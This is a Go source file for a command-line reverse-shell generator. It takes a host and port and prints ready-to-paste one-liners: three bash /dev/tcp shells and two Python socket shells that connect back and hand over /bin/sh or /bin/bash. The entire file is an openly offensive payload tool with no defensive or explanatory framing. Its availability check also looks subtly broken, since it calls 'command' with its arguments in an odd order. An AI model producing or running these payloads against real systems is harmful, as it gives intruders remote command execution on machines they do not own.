package main

import (
	"flag"
	"fmt"
	"os/exec"
)

/*
 * Bash colors and formatting for prettier output
 */
const (
	Yellow = "\033[1;33m%s\033[0m"
	Italic = "\033[3m%s\033[0m"
)

func main() {
	var host string
	flag.StringVar(&host, "host", "127.0.0.1", "Host IP address")

	var port int
	flag.IntVar(&port, "port", 4444, "Host port")

	flag.Parse()

	fmt.Printf(Yellow, "\n[inputs]\n\n")
	fmt.Println("host:", host)
	fmt.Println("port:", port)
	// fmt.Println("tail:", flag.Args())

	if isCommandAvailable("bash", "-v") {
		fmt.Printf(Yellow, "\n[bash]\n\n")

		bash1 := fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", host, port)
		fmt.Printf(Italic, "Bash 1\n")
		fmt.Println(bash1 + "\n")

		bash2 := fmt.Sprintf("0<&196;exec 196<>/dev/tcp/%s/%d; sh <&196 >&196 2>&196", host, port)
		fmt.Printf(Italic, "Bash 2\n")
		fmt.Println(bash2 + "\n")

		bash3 := fmt.Sprintf("exec 5<>/dev/tcp/%s/%d | cat <&5 | while read line; do $line 2>&5 >&5; done", host, port)
		fmt.Printf(Italic, "Bash 3\n")
		fmt.Println(bash3 + "\n")
	}

	if isCommandAvailable("python", "-v") {
		fmt.Printf(Yellow, "\n[python]\n\n")

		pythonSocket := fmt.Sprintf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\", %d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", host, port)
		fmt.Printf(Italic, "Uses socket\n")
		fmt.Println(pythonSocket + "\n")

		pythonPty := fmt.Sprintf("python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'", host, port)

		fmt.Printf(Italic, "Uses pty\n")
		fmt.Println(pythonPty + "\n")
	}
}

func isCommandAvailable(name string, args string) bool {
	cmd := exec.Command("command", args, name)
	if err := cmd.Run(); err != nil {
		return false
	}
	return true
}
